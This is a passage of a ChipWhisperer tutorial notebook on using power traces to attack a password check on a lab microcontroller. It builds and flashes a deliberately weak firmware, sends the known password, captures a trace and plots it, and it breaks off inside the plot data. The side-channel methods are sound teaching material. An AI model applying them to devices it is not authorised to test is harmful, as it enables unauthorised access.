
Timing Analysis with Power for Password Bypass
==============================================

This tutorial will introduce you to breaking devices by determining when
a device is performing certain operations. It will use a simple password
check, and demonstrate how to perform a basic power analysis.

Note this is not a prerequisite to the tutorial on breaking AES. You can
skip this tutorial if you wish to go ahead with the AES tutorial.


**In [1]:**

.. code:: ipython3

    SCOPETYPE = 'OPENADC'
    PLATFORM = 'CWLITEXMEGA'
    CRYPTO_TARGET = 'NONE'

Firmware
--------

Like before, we'll need to setup our ``PLATFORM``, then build the
firmware:


**In [2]:**

.. code:: bash

    %%bash -s "$PLATFORM" "$CRYPTO_TARGET"
    cd ../hardware/victims/firmware/basic-passwdcheck
    make PLATFORM=$1 CRYPTO_TARGET=$2


**Out [2]:**



.. parsed-literal::

    rm -f -- basic-passwdcheck-CWLITEXMEGA.hex
    rm -f -- basic-passwdcheck-CWLITEXMEGA.eep
    rm -f -- basic-passwdcheck-CWLITEXMEGA.cof
    rm -f -- basic-passwdcheck-CWLITEXMEGA.elf
    rm -f -- basic-passwdcheck-CWLITEXMEGA.map
    rm -f -- basic-passwdcheck-CWLITEXMEGA.sym
    rm -f -- basic-passwdcheck-CWLITEXMEGA.lss
    rm -f -- objdir/\*.o
    rm -f -- objdir/\*.lst
    rm -f -- basic-passwdcheck.s simpleserial.s XMEGA_AES_driver.s uart.s usart_driver.s xmega_hal.s
    rm -f -- basic-passwdcheck.d simpleserial.d XMEGA_AES_driver.d uart.d usart_driver.d xmega_hal.d
    rm -f -- basic-passwdcheck.i simpleserial.i XMEGA_AES_driver.i uart.i usart_driver.i xmega_hal.i
    .
    -------- begin --------
    avr-gcc (WinAVR 20100110) 4.3.3
    Copyright (C) 2008 Free Software Foundation, Inc.
    This is free software; see the source for copying conditions.  There is NO
    warranty; not even for MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.
    
    .
    Compiling C: basic-passwdcheck.c
    avr-gcc -c -mmcu=atxmega128d3 -I. -fpack-struct -gdwarf-2 -DSS_VER=SS_VER_1_0 -DHAL_TYPE=HAL_xmega -DPLATFORM=CWLITEXMEGA -DF_CPU=7372800UL -Os -funsigned-char -funsigned-bitfields -fshort-enums -Wall -Wstrict-prototypes -Wa,-adhlns=objdir/basic-passwdcheck.lst -I.././simpleserial/ -I.././hal -I.././hal/xmega -I.././crypto/ -std=gnu99 -MMD -MP -MF .dep/basic-passwdcheck.o.d basic-passwdcheck.c -o objdir/basic-passwdcheck.o 
    .
    Compiling C: .././simpleserial/simpleserial.c
    avr-gcc -c -mmcu=atxmega128d3 -I. -fpack-struct -gdwarf-2 -DSS_VER=SS_VER_1_0 -DHAL_TYPE=HAL_xmega -DPLATFORM=CWLITEXMEGA -DF_CPU=7372800UL -Os -funsigned-char -funsigned-bitfields -fshort-enums -Wall -Wstrict-prototypes -Wa,-adhlns=objdir/simpleserial.lst -I.././simpleserial/ -I.././hal -I.././hal/xmega -I.././crypto/ -std=gnu99 -MMD -MP -MF .dep/simpleserial.o.d .././simpleserial/simpleserial.c -o objdir/simpleserial.o 
    .
    Compiling C: .././hal/xmega/XMEGA_AES_driver.c
    avr-gcc -c -mmcu=atxmega128d3 -I. -fpack-struct -gdwarf-2 -DSS_VER=SS_VER_1_0 -DHAL_TYPE=HAL_xmega -DPLATFORM=CWLITEXMEGA -DF_CPU=7372800UL -Os -funsigned-char -funsigned-bitfields -fshort-enums -Wall -Wstrict-prototypes -Wa,-adhlns=objdir/XMEGA_AES_driver.lst -I.././simpleserial/ -I.././hal -I.././hal/xmega -I.././crypto/ -std=gnu99 -MMD -MP -MF .dep/XMEGA_AES_driver.o.d .././hal/xmega/XMEGA_AES_driver.c -o objdir/XMEGA_AES_driver.o 
    .
    Compiling C: .././hal/xmega/uart.c
    avr-gcc -c -mmcu=atxmega128d3 -I. -fpack-struct -gdwarf-2 -DSS_VER=SS_VER_1_0 -DHAL_TYPE=HAL_xmega -DPLATFORM=CWLITEXMEGA -DF_CPU=7372800UL -Os -funsigned-char -funsigned-bitfields -fshort-enums -Wall -Wstrict-prototypes -Wa,-adhlns=objdir/uart.lst -I.././simpleserial/ -I.././hal -I.././hal/xmega -I.././crypto/ -std=gnu99 -MMD -MP -MF .dep/uart.o.d .././hal/xmega/uart.c -o objdir/uart.o 
    .
    Compiling C: .././hal/xmega/usart_driver.c
    avr-gcc -c -mmcu=atxmega128d3 -I. -fpack-struct -gdwarf-2 -DSS_VER=SS_VER_1_0 -DHAL_TYPE=HAL_xmega -DPLATFORM=CWLITEXMEGA -DF_CPU=7372800UL -Os -funsigned-char -funsigned-bitfields -fshort-enums -Wall -Wstrict-prototypes -Wa,-adhlns=objdir/usart_driver.lst -I.././simpleserial/ -I.././hal -I.././hal/xmega -I.././crypto/ -std=gnu99 -MMD -MP -MF .dep/usart_driver.o.d .././hal/xmega/usart_driver.c -o objdir/usart_driver.o 
    .
    Compiling C: .././hal/xmega/xmega_hal.c
    avr-gcc -c -mmcu=atxmega128d3 -I. -fpack-struct -gdwarf-2 -DSS_VER=SS_VER_1_0 -DHAL_TYPE=HAL_xmega -DPLATFORM=CWLITEXMEGA -DF_CPU=7372800UL -Os -funsigned-char -funsigned-bitfields -fshort-enums -Wall -Wstrict-prototypes -Wa,-adhlns=objdir/xmega_hal.lst -I.././simpleserial/ -I.././hal -I.././hal/xmega -I.././crypto/ -std=gnu99 -MMD -MP -MF .dep/xmega_hal.o.d .././hal/xmega/xmega_hal.c -o objdir/xmega_hal.o 
    .
    Linking: basic-passwdcheck-CWLITEXMEGA.elf
    avr-gcc -mmcu=atxmega128d3 -I. -fpack-struct -gdwarf-2 -DSS_VER=SS_VER_1_0 -DHAL_TYPE=HAL_xmega -DPLATFORM=CWLITEXMEGA -DF_CPU=7372800UL -Os -funsigned-char -funsigned-bitfields -fshort-enums -Wall -Wstrict-prototypes -Wa,-adhlns=objdir/basic-passwdcheck.o -I.././simpleserial/ -I.././hal -I.././hal/xmega -I.././crypto/ -std=gnu99 -MMD -MP -MF .dep/basic-passwdcheck-CWLITEXMEGA.elf.d objdir/basic-passwdcheck.o objdir/simpleserial.o objdir/XMEGA_AES_driver.o objdir/uart.o objdir/usart_driver.o objdir/xmega_hal.o --output basic-passwdcheck-CWLITEXMEGA.elf -Wl,-Map=basic-passwdcheck-CWLITEXMEGA.map,--cref   -lm  
    .
    Creating load file for Flash: basic-passwdcheck-CWLITEXMEGA.hex
    avr-objcopy -O ihex -R .eeprom -R .fuse -R .lock -R .signature basic-passwdcheck-CWLITEXMEGA.elf basic-passwdcheck-CWLITEXMEGA.hex
    .
    Creating load file for EEPROM: basic-passwdcheck-CWLITEXMEGA.eep
    avr-objcopy -j .eeprom --set-section-flags=.eeprom="alloc,load" \
    	--change-section-lma .eeprom=0 --no-change-warnings -O ihex basic-passwdcheck-CWLITEXMEGA.elf basic-passwdcheck-CWLITEXMEGA.eep || exit 0
    .
    Creating Extended Listing: basic-passwdcheck-CWLITEXMEGA.lss
    avr-objdump -h -S -z basic-passwdcheck-CWLITEXMEGA.elf > basic-passwdcheck-CWLITEXMEGA.lss
    .
    Creating Symbol Table: basic-passwdcheck-CWLITEXMEGA.sym
    avr-nm -n basic-passwdcheck-CWLITEXMEGA.elf > basic-passwdcheck-CWLITEXMEGA.sym
    Size after:
       text	   data	    bss	    dec	    hex	filename
       2630	    304	    260	   3194	    c7a	basic-passwdcheck-CWLITEXMEGA.elf
    +--------------------------------------------------------
    + Built for platform CW-Lite XMEGA
    +--------------------------------------------------------



Setup
-----

Setup is the same as usual, except this time we'll be capturing 2000
traces.


**In [3]:**

.. code:: ipython3

    %run "Helper_Scripts/Setup.ipynb"


**In [4]:**

.. code:: ipython3

    fw_path = '../hardware/victims/firmware/basic-passwdcheck/basic-passwdcheck-{}.hex'.format(PLATFORM)


**In [5]:**

.. code:: ipython3

    cw.program_target(scope, prog, fw_path)


**Out [5]:**



.. parsed-literal::

    XMEGA Programming flash...
    XMEGA Reading flash...
    Verified flash OK, 2933 bytes
    


Communicating With The Target
-----------------------------

As was mentioned at the beginning of the tutorial, the firmware we
loaded onto the target implements a basic password check. After getting
a ``'\n'`` terminated password, the target checks it and enters an
infinite loop, so before communicating with it, we'll need to reset it.

We'll be doing this a lot, so we'll define a function that resets the
target (this function is also available by running
"Helper\_Scripts/Setup.ipynb" as we did above):


**In [6]:**

.. code:: ipython3

    import time
    def reset_target(scope):
        if PLATFORM == "CW303" or PLATFORM == "CWLITEXMEGA":
            scope.io.pdic = 'low'
            time.sleep(0.05)
            scope.io.pdic = 'high'
            time.sleep(0.05)
        else:  
            scope.io.nrst = 'low'
            time.sleep(0.05)
            scope.io.nrst = 'high'
            time.sleep(0.05)

The target sends some text to us upon starting. After running the block
below, you should see some text appear.

**NOTE** The text may appear cutoff, accompanied by a message about data
loss. This means that the buffer used to store serial data (128 bytes)
from the target is full. This isn't an issue here, since the text is
just aesthetic, but keep this in mind if you want to do large transfers
of serial data using ChipWhisperer.


**In [7]:**

.. code:: ipython3

    ret = ""
    reset_target(scope)
    
    num_char = target.in_waiting()
    while num_char > 0:
        ret += target.read(timeout=10)
        time.sleep(0.05)
        num_char = target.in_waiting()
        
    print(ret)


**Out [7]:**



.. parsed-literal::

    WARNING:root:SAM3U Serial buffers OVERRUN - data loss has occurred.
    WARNING:root:SAM3U Serial buffers OVERRUN - data loss has occurred.
    




.. parsed-literal::

      \*\*\*\*\*Safe-o-matic 3000 Booting...
    Aligning bits........[DONE]
    Checking Cesium RNG..[DONE]
    Masquerading flash...[DONE]
     \*\*\*\*\*SDecrypting database..[DONE]
    
    
    WARNING: UNAUTHORIZED ACCESS WILL BE PUNISHED
    Please enter password to continue: 
    


Now we can send the target a password:


**In [8]:**

.. code:: ipython3

    target.flush()
    target.write("h0px3\n")

And get the response. We sent it the right password (hopx3), so you
should see "Access granted, Welcome!":


**In [9]:**

.. code:: ipython3

    print(target.read(timeout=100))


**Out [9]:**



.. parsed-literal::

    Access granted, Welcome!
    
    


**tip**

In real systems, you may often know one of the passwords, which is
sufficient to investigate the password checking routines as we will do.
You also normally have an ability to reset passwords to default. While
the reset procedure would erase any data you care about, the attacker
will be able to use this 'sacrificial' device to learn about possible
vulnerabilities. So the assumption that we have access to the password
is really just saying we have access to a password, and will use that
knowledge to break the system in general.

Recording Traces
----------------

Now that we can communicate with our super-secure system, our next goal
is to get a power trace while the target is running. To do this, we'll
arm the scope just before we send our password attempt, then record the
trace as we've done before.


**In [10]:**

.. code:: ipython3

    if PLATFORM == "CWNANO":
        scope.adc.samples = 800
    else:
        scope.adc.samples = 2000


**In [11]:**

.. code:: ipython3

    ret = ""
    reset_target(scope)
    num_char = target.in_waiting()
    while num_char > 0:
        ret += target.read(timeout=10)
        time.sleep(0.01)
        num_char = target.in_waiting()
        
    print(ret)
    scope.arm()
    target.flush()
    target.write("h0px3\n")
    ret = scope.capture()
    if ret:
        print('Timeout happened during acquisition')
            
    trace = scope.get_last_trace()
    resp = ""
    num_char = target.in_waiting()
    while num_char > 0:
        resp += target.read(timeout=10)
        time.sleep(0.01)
        num_char = target.in_waiting()
    print(resp)


**Out [11]:**



.. parsed-literal::

     \*\*\*\*\*Safe-o-matic 3000 Booting...
    Aligning bits........[DONE]
    Checking Cesium RNG..[DONE]
    Masquerading flash...[DONE]
    Decrypting database..[DONE]
    
    
    WARNING: UNAUTHORIZED ACCESS WILL BE PUNISHED
    Please enter password to continue: 
    Access granted, Welcome!
    
    


Now that we have a trace, we'll use bokeh to plot it:


**In [12]:**

.. code:: ipython3

    from bokeh.plotting import figure, show 
    from bokeh.io import output_notebook
    from bokeh.models import CrosshairTool
    
    output_notebook()
    p = figure()
    x_range = range(0, len(trace))
    p.line(x_range, trace)
    show(p)


**Out [12]:**


.. raw:: html

    <div class="data_html">
        
        <div class="bk-root">
            <a href="https://bokeh.pydata.org" target="_blank" class="bk-logo bk-logo-small bk-logo-notebook"></a>
            <span id="1001">Loading BokehJS ...</span>
        </div>
    </div>



.. raw:: html

    

    <div id="99ae4de6-a188-4a11-8d58-15b79b175338"></div>
    <div class="output_subarea output_javascript ">
    <script type="text/javascript">
    var element = $('#99ae4de6-a188-4a11-8d58-15b79b175338');
        
    (function(root) {
      function now() {
        return new Date();
      }
    
      var force = true;
    
      if (typeof root._bokeh_onload_callbacks === "undefined" || force === true) {
        root._bokeh_onload_callbacks = [];
        root._bokeh_is_loading = undefined;
      }
    
      var JS_MIME_TYPE = 'application/javascript';
      var HTML_MIME_TYPE = 'text/html';
      var EXEC_MIME_TYPE = 'application/vnd.bokehjs_exec.v0+json';
      var CLASS_NAME = 'output_bokeh rendered_html';
    
      /**
       * Render data to the DOM node
       */
      function render(props, node) {
        var script = document.createElement("script");
        node.appendChild(script);
      }
    
      /**
       * Handle when an output is cleared or removed
       */
      function handleClearOutput(event, handle) {
        var cell = handle.cell;
    
        var id = cell.output_area._bokeh_element_id;
        var server_id = cell.output_area._bokeh_server_id;
        // Clean up Bokeh references
        if (id != null && id in Bokeh.index) {
          Bokeh.index[id].model.document.clear();
          delete Bokeh.index[id];
        }
    
        if (server_id !== undefined) {
          // Clean up Bokeh references
          var cmd = "from bokeh.io.state import curstate; print(curstate().uuid_to_server['" + server_id + "'].get_sessions()[0].document.roots[0]._id)";
          cell.notebook.kernel.execute(cmd, {
            iopub: {
              output: function(msg) {
                var id = msg.content.text.trim();
                if (id in Bokeh.index) {
                  Bokeh.index[id].model.document.clear();
                  delete Bokeh.index[id];
                }
              }
            }
          });
          // Destroy server and session
          var cmd = "import bokeh.io.notebook as ion; ion.destroy_server('" + server_id + "')";
          cell.notebook.kernel.execute(cmd);
        }
      }
    
      /**
       * Handle when a new output is added
       */
      function handleAddOutput(event, handle) {
        var output_area = handle.output_area;
        var output = handle.output;
    
        // limit handleAddOutput to display_data with EXEC_MIME_TYPE content only
        if ((output.output_type != "display_data") || (!output.data.hasOwnProperty(EXEC_MIME_TYPE))) {
          return
        }
    
        var toinsert = output_area.element.find("." + CLASS_NAME.split(' ')[0]);
    
        if (output.metadata[EXEC_MIME_TYPE]["id"] !== undefined) {
          toinsert[toinsert.length - 1].firstChild.textContent = output.data[JS_MIME_TYPE];
          // store reference to embed id on output_area
          output_area._bokeh_element_id = output.metadata[EXEC_MIME_TYPE]["id"];
        }
        if (output.metadata[EXEC_MIME_TYPE]["server_id"] !== undefined) {
          var bk_div = document.createElement("div");
          bk_div.innerHTML = output.data[HTML_MIME_TYPE];
          var script_attrs = bk_div.children[0].attributes;
          for (var i = 0; i < script_attrs.length; i++) {
            toinsert[toinsert.length - 1].firstChild.setAttribute(script_attrs[i].name, script_attrs[i].value);
          }
          // store reference to server id on output_area
          output_area._bokeh_server_id = output.metadata[EXEC_MIME_TYPE]["server_id"];
        }
      }
    
      function register_renderer(events, OutputArea) {
    
        function append_mime(data, metadata, element) {
          // create a DOM node to render to
          var toinsert = this.create_output_subarea(
            metadata,
            CLASS_NAME,
            EXEC_MIME_TYPE
          );
          this.keyboard_manager.register_events(toinsert);
          // Render to node
          var props = {data: data, metadata: metadata[EXEC_MIME_TYPE]};
          render(props, toinsert[toinsert.length - 1]);
          element.append(toinsert);
          return toinsert
        }
    
        /* Handle when an output is cleared or removed */
        events.on('clear_output.CodeCell', handleClearOutput);
        events.on('delete.Cell', handleClearOutput);
    
        /* Handle when a new output is added */
        events.on('output_added.OutputArea', handleAddOutput);
    
        /**
         * Register the mime type and append_mime function with output_area
         */
        OutputArea.prototype.register_mime_type(EXEC_MIME_TYPE, append_mime, {
          /* Is output safe? */
          safe: true,
          /* Index of renderer in `output_area.display_order` */
          index: 0
        });
      }
    
      // register the mime type if in Jupyter Notebook environment and previously unregistered
      if (root.Jupyter !== undefined) {
        var events = require('base/js/events');
        var OutputArea = require('notebook/js/outputarea').OutputArea;
    
        if (OutputArea.prototype.mime_types().indexOf(EXEC_MIME_TYPE) == -1) {
          register_renderer(events, OutputArea);
        }
      }
    
      
      if (typeof (root._bokeh_timeout) === "undefined" || force === true) {
        root._bokeh_timeout = Date.now() + 5000;
        root._bokeh_failed_load = false;
      }
    
      var NB_LOAD_WARNING = {'data': {'text/html':
         "<div style='background-color: #fdd'>\n"+
         "<p>\n"+
         "BokehJS does not appear to have successfully loaded. If loading BokehJS from CDN, this \n"+
         "may be due to a slow or bad network connection. Possible fixes:\n"+
         "</p>\n"+
         "<ul>\n"+
         "<li>re-rerun `output_notebook()` to attempt to load from CDN again, or</li>\n"+
         "<li>use INLINE resources instead, as so:</li>\n"+
         "</ul>\n"+
         "<code>\n"+
         "from bokeh.resources import INLINE\n"+
         "output_notebook(resources=INLINE)\n"+
         "</code>\n"+
         "</div>"}};
    
      function display_loaded() {
        var el = document.getElementById("1001");
        if (el != null) {
          el.textContent = "BokehJS is loading...";
        }
        if (root.Bokeh !== undefined) {
          if (el != null) {
            el.textContent = "BokehJS " + root.Bokeh.version + " successfully loaded.";
          }
        } else if (Date.now() < root._bokeh_timeout) {
          setTimeout(display_loaded, 100)
        }
      }
    
    
      function run_callbacks() {
        try {
          root._bokeh_onload_callbacks.forEach(function(callback) {
            if (callback != null)
              callback();
          });
        } finally {
          delete root._bokeh_onload_callbacks
        }
        console.debug("Bokeh: all callbacks have finished");
      }
    
      function load_libs(css_urls, js_urls, callback) {
        if (css_urls == null) css_urls = [];
        if (js_urls == null) js_urls = [];
    
        root._bokeh_onload_callbacks.push(callback);
        if (root._bokeh_is_loading > 0) {
          console.debug("Bokeh: BokehJS is being loaded, scheduling callback at", now());
          return null;
        }
        if (js_urls == null || js_urls.length === 0) {
          run_callbacks();
          return null;
        }
        console.debug("Bokeh: BokehJS not loaded, scheduling load and callback at", now());
        root._bokeh_is_loading = css_urls.length + js_urls.length;
    
        function on_load() {
          root._bokeh_is_loading--;
          if (root._bokeh_is_loading === 0) {
            console.debug("Bokeh: all BokehJS libraries/stylesheets loaded");
            run_callbacks()
          }
        }
    
        function on_error() {
          console.error("failed to load " + url);
        }
    
        for (var i = 0; i < css_urls.length; i++) {
          var url = css_urls[i];
          const element = document.createElement("link");
          element.onload = on_load;
          element.onerror = on_error;
          element.rel = "stylesheet";
          element.type = "text/css";
          element.href = url;
          console.debug("Bokeh: injecting link tag for BokehJS stylesheet: ", url);
          document.body.appendChild(element);
        }
    
        for (var i = 0; i < js_urls.length; i++) {
          var url = js_urls[i];
          var element = document.createElement('script');
          element.onload = on_load;
          element.onerror = on_error;
          element.async = false;
          element.src = url;
          console.debug("Bokeh: injecting script tag for BokehJS library: ", url);
          document.head.appendChild(element);
        }
      };var element = document.getElementById("1001");
      if (element == null) {
        console.error("Bokeh: ERROR: autoload.js configured with elementid '1001' but no matching script tag was found. ")
        return false;
      }
    
      function inject_raw_css(css) {
        const element = document.createElement("style");
        element.appendChild(document.createTextNode(css));
        document.body.appendChild(element);
      }
    
      var js_urls = ["https://cdn.pydata.org/bokeh/release/bokeh-1.2.0.min.js", "https://cdn.pydata.org/bokeh/release/bokeh-widgets-1.2.0.min.js", "https://cdn.pydata.org/bokeh/release/bokeh-tables-1.2.0.min.js", "https://cdn.pydata.org/bokeh/release/bokeh-gl-1.2.0.min.js"];
      var css_urls = ["https://cdn.pydata.org/bokeh/release/bokeh-1.2.0.min.css", "https://cdn.pydata.org/bokeh/release/bokeh-widgets-1.2.0.min.css", "https://cdn.pydata.org/bokeh/release/bokeh-tables-1.2.0.min.css"];
    
      var inline_js = [
        function(Bokeh) {
          Bokeh.set_log_level("info");
        },
        
        function(Bokeh) {
          
        },
        function(Bokeh) {} // ensure no trailing comma for IE
      ];
    
      function run_inline_js() {
        
        if ((root.Bokeh !== undefined) || (force === true)) {
          for (var i = 0; i < inline_js.length; i++) {
            inline_js[i].call(root, root.Bokeh);
          }if (force === true) {
            display_loaded();
          }} else if (Date.now() < root._bokeh_timeout) {
          setTimeout(run_inline_js, 100);
        } else if (!root._bokeh_failed_load) {
          console.log("Bokeh: BokehJS failed to load within specified timeout.");
          root._bokeh_failed_load = true;
        } else if (force !== true) {
          var cell = $(document.getElementById("1001")).parents('.cell').data().cell;
          cell.output_area.append_execute_result(NB_LOAD_WARNING)
        }
    
      }
    
      if (root._bokeh_is_loading === 0) {
        console.debug("Bokeh: BokehJS loaded, going straight to plotting");
        run_inline_js();
      } else {
        load_libs(css_urls, js_urls, function() {
          console.debug("Bokeh: BokehJS plotting callback run at", now());
          run_inline_js();
        });
      }
    }(window));
    </script>
    </div>


.. raw:: html

    <div class="data_html">
        
    
    
    
    
    
      <div class="bk-root" id="52d4c9cb-6b71-41f6-a9e7-0b290f3e6f70" data-root-id="1002"></div>
    
    </div>



.. raw:: html

    

    <div id="4c2cfddd-6def-4df9-8a56-dddbd080aa30"></div>
    <div class="output_subarea output_javascript ">
    <script type="text/javascript">
    var element = $('#4c2cfddd-6def-4df9-8a56-dddbd080aa30');
        (function(root) {
      function embed_document(root) {
        
      var docs_json = {"d2eb6f3b-8675-4e24-ad53-adf2ee1245b5":{"roots":{"references":[{"attributes":{"below":[{"id":"1011","type":"LinearAxis"}],"center":[{"id":"1015","type":"Grid"},{"id":"1020","type":"Grid"}],"left":[{"id":"1016","type":"LinearAxis"}],"renderers":[{"id":"1037","type":"GlyphRenderer"}],"title":{"id":"1039","type":"Title"},"toolbar":{"id":"1027","type":"Toolbar"},"x_range":{"id":"1003","type":"DataRange1d"},"x_scale":{"id":"1007","type":"LinearScale"},"y_range":{"id":"1005","type":"DataRange1d"},"y_scale":{"id":"1009","type":"LinearScale"}},"id":"1002","subtype":"Figure","type":"Plot"},{"attributes":{},"id":"1044","type":"BasicTickFormatter"},{"attributes":{"bottom_units":"screen","fill_alpha":{"value":0.5},"fill_color":{"value":"lightgrey"},"left_units":"screen","level":"overlay","line_alpha":{"value":1.0},"line_color":{"value":"black"},"line_dash":[4,4],"line_width":{"value":2},"render_mode":"css","right_units":"screen","top_units":"screen"},"id":"1045","type":"BoxAnnotation"},{"attributes":{},"id":"1046","type":"UnionRenderers"},{"attributes":{"callback":null},"id":"1003","type":"DataRange1d"},{"attributes":{"line_color":"#1f77b4","x":{"field":"x"},"y":{"field":"y"}},"id":"1035","type":"Line"},{"attributes":{},"id":"1047","type":"Selection"},{"attributes":{"callback":null,"data":{"x":[0,1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27,28,29,30,31,32,33,34,35,36,37,38,39,40,41,42,43,44,45,46,47,48,49,50,51,52,53,54,55,56,57,58,59,60,61,62,63,64,65,66,67,68,69,70,71,72,73,74,75,76,77,78,79,80,81,82,83,84,85,86,87,88,89,90,91,92,93,94,95,96,97,98,99,100,101,102,103,104,105,106,107,108,109,110,111,112,113,114,115,116,117,118,119,120,121,122,123,124,125,126,127,128,129,130,131,132,133,134,135,136,137,138,139,140,141,142,143,144,145,146,147,148,149,150,151,152,153,154,155,156,157,158,159,160,161,162,163,164,165,166,167,168,169,170,171,172,173,174,175,176,177,178,179,180,181,182,183,184,185,186,187,188,189,190,191,192,193,194,195,196,197,198,199,200,201,202,203,204,205,206,207,208,209,210,211,212,213,214,215,216,217,218,219,220,221,222,223,224,225,226,227,228,229,230,231,232,233,234,235,236,237,238,239,240,241,242,243,244,245,246,247,248,249,250,251,252,253,254,255,256,257,258,259,260,261,262,263,264,265,266,267,268,269,270,271,272,273,274,275,276,277,278,279,280,281,282,283,284,285,286,287,288,289,290,291,292,293,294,295,296,297,298,299,300,301,302,303,304,305,306,307,308,309,310,311,312,313,314,315,316,317,318,319,320,321,322,323,324,325,326,327,328,329,330,331,332,333,334,335,336,337,338,339,340,341,342,343,344,345,346,347,348,349,350,351,352,353,354,355,356,357,358,359,360,361,362,363,364,365,366,367,368,369,370,371,372,373,374,375,376,377,378,379,380,381,382,383,384,385,386,387,388,389,390,391,392,393,394,395,396,397,398,399,400,401,402,403,404,405,406,407,408,409,410,411,412,413,414,415,416,417,418,419,420,421,422,423,424,425,426,427,428,429,430,431,432,433,434,435,436,437,438,439,440,441,442,443,444,445,446,447,448,449,450,451,452,453,454,455,456,457,458,459,460,461,462,463,464,465,466,467,468,469,470,471,472,473,474,475,476,477,478,479,480,481,482,483,484,485,486,487,488,489,490,491,492,493,494,495,496,497,498,499,500,501,502,503,504,505,506,507,508,509,510,511,512,513,514,515,516,517,518,519,520,521,522,523,524,525,526,527,528,529,530,531,532,533,534,535,536,537,538,539,540,541,542,543,544,545,546,547,548,549,550,551,552,553,554,555,556,557,558,559,560,561,562,563,564,565,566,567,568,569,570,571,572,573,574,575,576,577,578,579,580,581,582,583,584,585,586,587,588,589,590,591,592,593,594,595,596,597,598,599,600,601,602,603,604,605,606,607,608,609,610,611,612,613,614,615,616,617,618,619,620,621,622,623,624,625,626,627,628,629,630,631,632,633,634,635,636,637,638,639,640,641,642,643,644,645,646,647,648,649,650,651,652,653,654,655,656,657,658,659,660,661,662,663,664,665,666,667,668,669,670,671,672,673,674,675,676,677,678,679,680,681,682,683,684,685,686,687,688,689,690,691,692,693,694,695,696,697,698,699,700,701,702,703,704,705,706,707,708,709,710,711,712,713,714,715,716,717,718,719,720,721,722,723,724,725,726,727,728,729,730,731,732,733,734,735,736,737,738,739,740,741,742,743,744,745,746,747,748,749,750,751,752,753,754,755,756,757,758,759,760,761,762,763,764,765,766,767,768,769,770,771,772,773,774,775,776,777,778,779,780,781,782,783,784,785,786,787,788,789,790,791,792,793,794,795,796,797,798,799,800,801,802,803,804,805,806,807,808,809,810,811,812,813,814,815,816,817,818,819,820,821,822,823,824,825,826,827,828,829,830,831,832,833,834,835,836,837,838,839,840,841,842,843,844,845,846,847,848,849,850,851,852,853,854,855,856,857,858,859,860,861,862,863,864,865,866,867,868,869,870,871,872,873,874,875,876,877,878,879,880,881,882,883,884,885,886,887,888,889,890,891,892,893,894,895,896,897,898,899,900,901,902,903,904,905,906,907,908,909,910,911,912,913,914,915,916,917,918,919,920,921,922,923,924,925,926,927,928,929,930,931,932,933,934,935,936,937,938,939,940,941,942,943,944,945,946,947,948,949,950,951,952,953,954,955,956,957,958,959,960,961,962,963,964,965,966,967,968,969,970,971,972,973,974,975,976,977,978,979,980,981,982,983,984,985,986,987,988,989,990,991,992,993,994,995,996,997,998,999,1000,1001,1002,1003,1004,1005,1006,1007,1008,1009,1010,1011,1012,1013,1014,1015,1016,1017,1018,1019,1020,1021,1022,1023,1024,1025,1026,1027,1028,1029,1030,1031,1032,1033,1034,1035,1036,1037,1038,1039,1040,1041,1042,1043,1044,1045,1046,1047,1048,1049,1050,1051,1052,1053,1054,1055,1056,1057,1058,1059,1060,1061,1062,1063,1064,1065,1066,1067,1068,1069,1070,1071,1072,1073,1074,1075,1076,1077,1078,1079,1080,1081,1082,1083,1084,1085,1086,1087,1088,1089,1090,1091,1092,1093,1094,1095,1096,1097,1098,1099,1100,1101,1102,1103,1104,1105,1106,1107,1108,1109,1110,1111,1112,1113,1114,1115,1116,1117,1118,1119,1120,1121,1122,1123,1124,1125,1126,1127,1128,1129,1130,1131,1132,1133,1134,1135,1136,1137,1138,1139,1140,1141,1142,1143,1144,1145,1146,1147,1148,1149,1150,1151,1152,1153,1154,1155,1156,1157,1158,1159,1160,1161,1162,1163,1164,1165,1166,1167,1168,1169,1170,1171,1172,1173,1174,1175,1176,1177,1178,1179,1180,1181,1182,1183,1184,1185,1186,1187,1188,1189,1190,1191,1192,1193,1194,1195,1196,1197,1198,1199,1200,1201,1202,1203,1204,1205,1206,1207,1208,1209,1210,1211,1212,1213,1214,1215,1216,1217,1218,1219,1220,1221,1222,1223,1224,1225,1226,1227,1228,1229,1230,1231,1232,1233,1234,1235,1236,1237,1238,1239,1240,1241,1242,1243,1244,1245,1246,1247,1248,1249,1250,1251,1252,1253,1254,1255,1256,1257,1258,1259,1260,1261,1262,1263,1264,1265,1266,1267,1268,1269,1270,1271,1272,1273,1274,1275,1276,1277,1278,1279,1280,1281,1282,1283,1284,1285,1286,1287,1288,1289,1290,1291,1292,1293,1294,1295,1296,1297,1298,1299,1300,1301,1302,1303,1304,1305,1306,1307,1308,1309,1310,1311,1312,1313,1314,1315,1316,1317,1318,1319,1320,1321,1322,1323,1324,1325,1326,1327,1328,1329,1330,1331,1332,1333,1334,1335,1336,1337,1338,1339,1340,1341,1342,1343,1344,1345,1346,1347,1348,1349,1350,1351,1352,1353,1354,1355,1356,1357,1358,1359,1360,1361,1362,1363,1364,1365,1366,1367,1368,1369,1370,1371,1372,1373,1374,1375,1376,1377,1378,1379,1380,1381,1382,1383,1384,1385,1386,1387,1388,1389,1390,1391,1392,1393,1394,1395,1396,1397,1398,1399,1400,1401,1402,1403,1404,1405,1406,1407,1408,1409,1410,1411,1412,1413,1414,1415,1416,1417,1418,1419,1420,1421,1422,1423,1424,1425,1426,1427,1428,1429,1430,1431,1432,1433,1434,1435,1436,1437,1438,1439,1440,1441,1442,1443,1444,1445,1446,1447,1448,1449,1450,1451,1452,1453,1454,1455,1456,1457,1458,1459,1460,1461,1462,1463,1464,1465,1466,1467,1468,1469,1470,1471,1472,1473,1474,1475,1476,1477,1478,1479,1480,1481,1482,1483,1484,1485,1486,1487,1488,1489,1490,1491,1492,1493,1494,1495,1496,1497,1498,1499,1500,1501,1502,1503,1504,1505,1506,1507,1508,1509,1510,1511,1512,1513,1514,1515,1516,1517,1518,1519,1520,1521,1522,1523,1524,1525,1526,1527,1528,1529,1530,1531,1532,1533,1534,1535,1536,1537,1538,1539,1540,1541,1542,1543,1544,1545,1546,1547,1548,1549,1550,1551,1552,1553,1554,1555,1556,1557,1558,1559,1560,1561,1562,1563,1564,1565,1566,1567,1568,1569,1570,1571,1572,1573,1574,1575,1576,1577,1578,1579,1580,1581,1582,1583,1584,1585,1586,1587,1588,1589,1590,1591,1592,1593,1594,1595,1596,1597,1598,1599,1600,1601,1602,1603,